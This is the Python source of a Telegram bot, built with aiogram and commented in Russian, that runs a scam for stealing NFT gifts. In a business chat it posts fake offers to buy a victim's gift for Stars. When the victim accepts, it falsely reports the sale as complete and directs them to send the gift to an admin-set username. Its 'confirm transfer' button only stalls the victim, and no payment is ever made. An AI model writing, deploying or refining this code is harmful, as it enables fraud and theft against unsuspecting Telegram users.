import asyncio
import logging
import os
import aiosqlite
from aiohttp import web

from aiogram import Bot, Dispatcher, F, Router, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    BusinessConnection, Message, CallbackQuery
)
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# --- НАСТРОЙКИ ---
BOT_TOKEN = os.getenv("BOT_TOKEN", "ВАШ_ТОКЕН_ЗДЕСЬ")
ADMIN_ID = int(os.getenv("ADMIN_ID", 123456789)) # Ваш Telegram ID
WEBHOOK_HOST = os.getenv("RENDER_EXTERNAL_URL", "") # Render сам подставит URL
WEBHOOK_PATH = "/webhook"
WEBHOOK_URL = f"{WEBHOOK_HOST}{WEBHOOK_PATH}"
PORT = int(os.getenv("PORT", 8080))
DB_NAME = "bot_database.db"

# --- БАЗА ДАННЫХ ---
async def init_db():
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute('''CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )''')
        await db.execute('''CREATE TABLE IF NOT EXISTS templates (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            text TEXT
        )''')
        # Начальные настройки
        await db.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('target_username', 'Gifter_Manager')")
        await db.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('star_emoji', '<tg-emoji emoji-id=\"5368324170671202286\">⭐</tg-emoji>')")
        await db.commit()

async def get_setting(key: str):
    async with aiosqlite.connect(DB_NAME) as db:
        async with db.execute("SELECT value FROM settings WHERE key = ?", (key,)) as cursor:
            row = await cursor.fetchone()
            return row[0] if row else None

async def set_setting(key: str, value: str):
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
        await db.commit()

# --- СОСТОЯНИЯ FSM (Админка) ---
class AdminStates(StatesGroup):
    waiting_for_username = State()
    waiting_for_emoji = State()
    waiting_for_template = State()

# --- ИНИЦИАЛИЗАЦИЯ ---
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

# --- КЛАВИАТУРЫ ---
def get_offer_keyboard(giver_username: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"decline_{giver_username}"),
            InlineKeyboardButton(text="✅ Принять", callback_data=f"accept_{giver_username}")
        ]
    ])

def get_success_keyboard(target_username: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➡️ Передать NFT", url=f"tg://send_gift?to={target_username}")],
        [InlineKeyboardButton(text="❓ Как передать?", callback_data="how_to_transfer")]
    ])

def get_instruction_keyboard(target_username: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬇️ Передать подарок", url=f"tg://send_gift?to={target_username}")],
        [InlineKeyboardButton(text="✅ Подтвердить передачу", callback_data="confirm_transfer")]
    ])

def get_admin_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Изменить юзернейм получателя", callback_data="admin_set_user")],
        [InlineKeyboardButton(text="Изменить премиум-эмодзи", callback_data="admin_set_emoji")],
        [InlineKeyboardButton(text="Создать шаблон (.shab)", callback_data="admin_create_tpl")]
    ])

# --- ОБРАБОТЧИКИ БИЗНЕС-ЧАТОВ ---

# Инструкция по созданию предложения
@router.message(F.text == ".help")
async def show_help(message: Message):
    text = (
        "📄 <b>Инструкция по созданию предложения</b>\n\n"
        "Отправь команду в подключённом чате Telegram Business в следующем формате:\n\n"
        "<code>.buy язык ссылка сумма валюта</code>\n\n"
        "🇷🇺 <b>Пример на русском:</b>\n"
        "<code>.buy ru https://t.me/nft/Model-328434 1500 stars</code>\n\n"
        "🇬🇧 <b>Пример на английском:</b>\n"
        "<code>.buy eng https://t.me/nft/Model-328434 1500 stars</code>\n\n"
        "🛠 <b>Параметры:</b>\n"
        "• <code>ru</code> — русский язык\n"
        "• <code>eng</code> — английский язык\n"
        "• <code>ссылка</code> — ссылка на подарок\n"
        "• <code>1500</code> — сумма предложения\n"
        "• <code>stars</code> — валюта Stars\n"
        "• <code>gram</code> — валюта GRAM\n\n"
        "Или используйте шаблон:\n"
        "<code>.shab [номер]</code>"
    )
    # Пытаемся ответить в бизнес-чате, если это бизнес-сообщение
    if message.business_connection_id:
        await message.reply(text)
    else:
        await message.answer(text)

# Обработка команды .buy
@router.business_message(F.text.startswith(".buy"))
async def process_buy_command(message: Message):
    args = message.text.split()
    if len(args) < 5:
        await message.reply("❌ Неверный формат. Используйте <code>.buy ru [ссылка] [сумма] [валюта]</code>")
        return
    
    lang, link, amount, currency = args[1], args[2], args[3], args[4]
    
    # Получаем NFT ID из ссылки для красоты (например Model-328434)
    nft_name = link.split("/")[-1].replace("-", " #") if "/" in link else "NFT"
    
    star_emoji = await get_setting("star_emoji")
    giver_username = message.from_user.username or message.from_user.first_name
    
    text = (
        f"Пользователь <b>{giver_username}</b> предлагает\n"
        f"Вам <b>{amount}</b> {star_emoji} за подарок\n"
        f"<b>{nft_name}</b>.\n\n"
        f"Предложение действует ещё 24ч."
    )
    
    # Отправляем сообщение-оффер
    await message.reply(text, reply_markup=get_offer_keyboard(giver_username), parse_mode=ParseMode.HTML)
    # Удаляем команду пользователя (по желанию, чтобы было чисто)
    try:
        await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
    except:
        pass

# --- ОБРАБОТЧИКИ КНОПОК (CALLBACK) ---

# Отклонить
@router.callback_query(F.data.startswith("decline_"))
async def decline_offer(callback: CallbackQuery):
    # Изменяем текст сообщения
    await callback.message.edit_text(
        text="❌ <b>Предложение отклонено.</b>",
        reply_markup=None
    )
    await callback.answer("Вы отклонили предложение.")

# Принять
@router.callback_query(F.data.startswith("accept_"))
async def accept_offer(callback: CallbackQuery):
    giver = callback.data.split("_")[1]
    
    # Всплывающее окно (уведомление)
    await callback.answer(
        "После принятия следуйте инструкциям бота для дальнейших действий.\n\n"
        "Если вы всё прочитали и ознакомились, нажмите «ОК».",
        show_alert=True
    )
    
    # Изменяем сообщение на "Успешно продан"
    target_username = await get_setting("target_username")
    
    text = (
        "🎁 Подарок: <b>BowTie #51908</b>\n" # Можно сделать динамическим
        "успешно продан!\n\n"
        "<b>Передайте подарок</b>\n"
        "<b>покупателю для зачисления</b>\n"
        "<b>звёзд.</b>"
    )
    await callback.message.edit_text(text, reply_markup=get_success_keyboard(target_username))

# Кнопка "Как передать?"
@router.callback_query(F.data == "how_to_transfer")
async def how_to_transfer(callback: CallbackQuery):
    target_username = await get_setting("target_username")
    
    text = (
        "<b>Инструкция для завершения сделки:</b>\n"
        f"1. Передайте подарок пользователю\n"
        f"@{target_username}.\n"
        "2. Нажмите «Передать подарок» и\n"
        "выберите <b>Chill Flame #292858</b>.\n"
        "3. Подтвердите передачу подарка.\n\n"
        "Предложение действительно 24 часа."
    )
    await callback.message.edit_text(text, reply_markup=get_instruction_keyboard(target_username))

# Кнопка "Подтвердить передачу"
@router.callback_query(F.data == "confirm_transfer")
async def confirm_transfer(callback: CallbackQuery):
    await callback.answer(
        "⏳ Подарок пока не найден на аккаунте. Ожидайте автоматической проверки.",
        show_alert=True
    )

# --- АДМИН ПАНЕЛЬ ---
@router.message(Command("admin"), F.from_user.id == ADMIN_ID)
async def admin_panel(message: Message):
    await message.answer("👑 <b>Админ-панель</b>\nВыберите действие:", reply_markup=get_admin_keyboard())

@router.callback_query(F.data == "admin_set_user", F.from_user.id == ADMIN_ID)
async def admin_set_user(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer("Введите новый юзернейм получателя (без @):")
    await state.set_state(AdminStates.waiting_for_username)
    await callback.answer()

@router.message(AdminStates.waiting_for_username, F.from_user.id == ADMIN_ID)
async def process_username(message: Message, state: FSMContext):
    await set_setting("target_username", message.text)
    await message.answer(f"✅ Юзернейм изменен на @{message.text}")
    await state.clear()

@router.callback_query(F.data == "admin_set_emoji", F.from_user.id == ADMIN_ID)
async def admin_set_emoji(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer("Отправьте ID премиум-эмодзи (только цифры):")
    await state.set_state(AdminStates.waiting_for_emoji)
    await callback.answer()

@router.message(AdminStates.waiting_for_emoji, F.from_user.id == ADMIN_ID)
async def process_emoji(message: Message, state: FSMContext):
    # Формируем HTML-тег для премиум эмодзи
    emoji_tag = f'<tg-emoji emoji-id="{message.text}">⭐</tg-emoji>'
    await set_setting("star_emoji", emoji_tag)
    await message.answer(f"✅ Эмодзи обновлено.")
    await state.clear()

@router.callback_query(F.data == "admin_create_tpl", F.from_user.id == ADMIN_ID)
async def admin_create_tpl(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer("Введите текст шаблона (можно использовать HTML):")
    await state.set_state(AdminStates.waiting_for_template)
    await callback.answer()

@router.message(AdminStates.waiting_for_template, F.from_user.id == ADMIN_ID)
async def process_template(message: Message, state: FSMContext):
    async with aiosqlite.connect(DB_NAME) as db:
        cursor = await db.execute("INSERT INTO templates (text) VALUES (?)", (message.html_text,))
        tpl_id = cursor.lastrowid
        await db.commit()
    await message.answer(f"✅ Шаблон создан! Чтобы вызвать его, напишите в бизнес-чат:\n<code>.shab {tpl_id}</code>")
    await state.clear()

# Обработка команды .shab
@router.business_message(F.text.startswith(".shab"))
async def process_shab_command(message: Message):
    args = message.text.split()
    if len(args) < 2:
        await message.reply("❌ Укажите номер шаблона: <code>.shab 1</code>")
        return
    
    tpl_id = args[1]
    async with aiosqlite.connect(DB_NAME) as db:
        async with db.execute("SELECT text FROM templates WHERE id = ?", (tpl_id,)) as cursor:
            row = await cursor.fetchone()
            
    if row:
        await message.reply(row[0], parse_mode=ParseMode.HTML)
    else:
        await message.reply("❌ Шаблон с таким номером не найден.")

# --- ВЕБХУК ДЛЯ RENDER ---
async def on_startup(bot: Bot):
    await init_db()
    if WEBHOOK_HOST:
        await bot.set_webhook(WEBHOOK_URL)
        logging.info(f"Webhook set to {WEBHOOK_URL}")
    else:
        logging.warning("WEBHOOK_HOST is not set, skipping webhook setup (useful for local testing with polling).")

async def on_shutdown(bot: Bot):
    if WEBHOOK_HOST:
        await bot.delete_webhook()

def main():
    logging.basicConfig(level=logging.INFO)
    
    app = web.Application()
    webhook_requests_handler = SimpleRequestHandler(dispatcher=dp, bot=bot)
    webhook_requests_handler.register(app, path=WEBHOOK_PATH)
    setup_application(app, dp, bot=bot)

    dp.startup.register(on_startup)
    dp.shutdown.register(on_shutdown)

    # Запуск веб-сервера для Render
    web.run_app(app, host="0.0.0.0", port=PORT)

if __name__ == "__main__":
    main()
